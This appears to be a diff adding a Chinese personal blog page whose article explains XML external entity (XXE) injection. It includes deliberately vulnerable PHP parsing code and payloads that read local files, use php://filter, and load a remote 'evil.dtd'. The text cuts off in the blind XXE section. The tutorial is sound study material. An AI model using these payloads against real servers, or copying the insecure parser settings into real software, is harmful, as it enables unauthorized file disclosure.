@@ -1,0 +1,636 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>XXE学习 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="XXE学习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-03-01 19:57" pubdate>
+        2020年3月1日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      36
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">XXE学习</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年12月16日 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/#%E5%AE%9E%E9%AA%8C%E4%BA%8C%EF%BC%9A%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-Blind-OOB-XXE">一篇文章带你理解漏洞之 XXE 漏洞</a></p>
+<p>以下大部分的知识摘抄自上面的链接。</p>
+<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。</p>
+<p>在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</p>
+<h2 id="２．基础知识"><a href="#２．基础知识" class="headerlink" title="２．基础知识"></a>２．基础知识</h2><p>XML 文档有一个格式规范，是由一个叫做 DTD（document type definition） 的东西控制的。</p>
+<p>示例如下：</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span>//这一行是 XML 文档定义</span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [　　　//这一行定义了 XML 的根元素是 note</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">receiver</span> ,<span class="hljs-meta-keyword">sender</span> ,<span class="hljs-meta-keyword">header</span> ,<span class="hljs-meta-keyword">msg</span>)&gt;</span> //note根元素下面有一些子元素</span><br><span class="xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">receiver</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">sender</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">header</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">msg</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>要正常调用使用的话， XML 信息必须像下面这么写。</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span>&gt;</span>Myself<span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">sender</span>&gt;</span>Someone<span class="hljs-tag">&lt;/<span class="hljs-name">sender</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>TheReminder<span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">msg</span>&gt;</span>This is an amazing book<span class="hljs-tag">&lt;/<span class="hljs-name">msg</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-string">&quot;test&quot;</span> &gt;</span>]&gt;</span><br></code></pre></td></tr></table></figure>
+<p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">pass</span>&gt;</span>mypass<span class="hljs-tag">&lt;/<span class="hljs-name">pass</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p>
+<h3 id="划分重点了："><a href="#划分重点了：" class="headerlink" title="划分重点了："></a><strong>划分重点了：</strong></h3><p><strong>重点一：</strong></p>
+<p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">pass</span>&gt;</span>mypass<span class="hljs-tag">&lt;/<span class="hljs-name">pass</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素名称 <span class="hljs-meta-keyword">PUBLIC</span> “DTD标识名” “公用DTD的URI”&gt;</span><br></code></pre></td></tr></table></figure>
+<p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p>
+<p><strong>重点二：</strong></p>
+<p>我们上面已经将实体分成了两个派别（内部实体和外部外部）</p>
+<p>从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）</p>
+<p><strong>1.通用实体</strong></p>
+<p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">updateProfile</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">updateProfile</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Joe<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span>  <br>    ... <br><span class="hljs-tag">&lt;/<span class="hljs-name">updateProfile</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p><strong>2.参数实体：</strong></p>
+<p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 %实体名; 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p>
+<p><strong>示例代码：</strong></p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">an-element</span> <span class="hljs-meta-string">&quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;</span>&gt;</span> </span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote-dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://somewhere.example.org/remote.dtd&quot;</span>&gt;</span> </span><br><span class="perl">%an-element; %remote-dtd;</span><br></code></pre></td></tr></table></figure>
+<p><strong>抛转：</strong></p>
+<p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p>
+<h2 id="３-XXE注入攻击产生原理"><a href="#３-XXE注入攻击产生原理" class="headerlink" title="３.XXE注入攻击产生原理"></a>３.XXE注入攻击产生原理</h2><p>XXE漏洞全称XML外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p>
+<p>xxe漏洞触发的点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。</p>
+<h3 id="1-简单XXE漏洞代码编写"><a href="#1-简单XXE漏洞代码编写" class="headerlink" title="1.简单XXE漏洞代码编写"></a>1.简单XXE漏洞代码编写</h3><h4 id="1-file-get-contents-函数"><a href="#1-file-get-contents-函数" class="headerlink" title="1.file_get_contents()函数"></a>1.file_get_contents()函数</h4><p>file_get_contents()函数把整个文件读入一个字符串中。</p>
+<p><strong>php://input是个可以访问请求的原始数据的只读流。</strong></p>
+<p>服务器结合file_get_contents(“php://input”)可以读取我们post提交的数据。</p>
+<h4 id="2-simplexml-load-string-函数"><a href="#2-simplexml-load-string-函数" class="headerlink" title="2.simplexml_load_string()函数"></a>2.simplexml_load_string()函数</h4><p>该函数是将XML格式的字符串转换为对应的SimpleXMLElement</p>
+<p>例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    libxml_disable_entity_loader (<span class="hljs-literal">false</span>);<br>    <span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <br>    <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$creds</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="2-有回显读本地敏感文件"><a href="#2-有回显读本地敏感文件" class="headerlink" title="2.有回显读本地敏感文件"></a>2.有回显读本地敏感文件</h3><p>漏洞代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    libxml_disable_entity_loader (<span class="hljs-literal">false</span>);<br>    <span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <br>    <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$creds</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><strong>payload：</strong></p>
+<p>1.读取本地文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span></span><br><span class="hljs-meta">   	<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///C:/WINDOWS/WIN.INI&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">xxe常见POC类型：<br><br><span class="hljs-number">1</span>.file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/path/</span>to/file.txt<br><br><span class="hljs-number">2</span>.http:<span class="hljs-regexp">//u</span>rl/file.txt<br><br><span class="hljs-number">3</span>.php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=conf.php<br><span class="hljs-regexp">//</span>file协议直接读取php文件会报错，因此可以采用上面php流中Filter<br><br>echo <span class="hljs-string">&quot;base64加密后的密文&quot;</span> | base64 -d<br></code></pre></td></tr></table></figure>
+<p>**拓展：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhangquan-yw/p/10183067.html">参考链接</a>**有时候我们在读取我们想要的文件时，由于目标文件有些字符会被XML解析器当作标记进行处理。如果希望把这些字符作为普通字符处理，就需要使用实体引用或CDATA段。实体引用在ｃｔｆ中的使用性并不高，因此一般采用CDATA字段解决，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记。</p>
+<p>格式如下</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">&lt;![CDATA[</span><br><br><span class="xml">XXXXXXXXXXXXXXXXX</span><br><br><span class="xml">]]&gt;</span><br></code></pre></td></tr></table></figure>
+<p>在<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/#%E6%96%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%87%BA%E7%8E%B0">这篇文章中</a>作者已经尝试了用实体连续引用来使用CDATA</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">payload:</span><br><br><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">roottag</span> [</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">start</span> <span class="hljs-meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">goodies</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///d:/test.txt&quot;</span>&gt;</span>  </span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">end</span> <span class="hljs-meta-string">&quot;]]&gt;&quot;</span>&gt;</span>  </span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span> </span><br><span class="xml">%dtd; ]&gt; </span><br><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">roottag</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">roottag</span>&gt;</span></span><br><br><br><br><span class="xml">evil.dtd</span><br><br><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span> </span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">all</span> <span class="hljs-meta-string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="2-无回显的情况："><a href="#2-无回显的情况：" class="headerlink" title="2. 无回显的情况："></a>2. 无回显的情况：</h2><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs erb"><br><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [</span></span><br><span class="xml">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span></span><br><span class="xml">   	<span 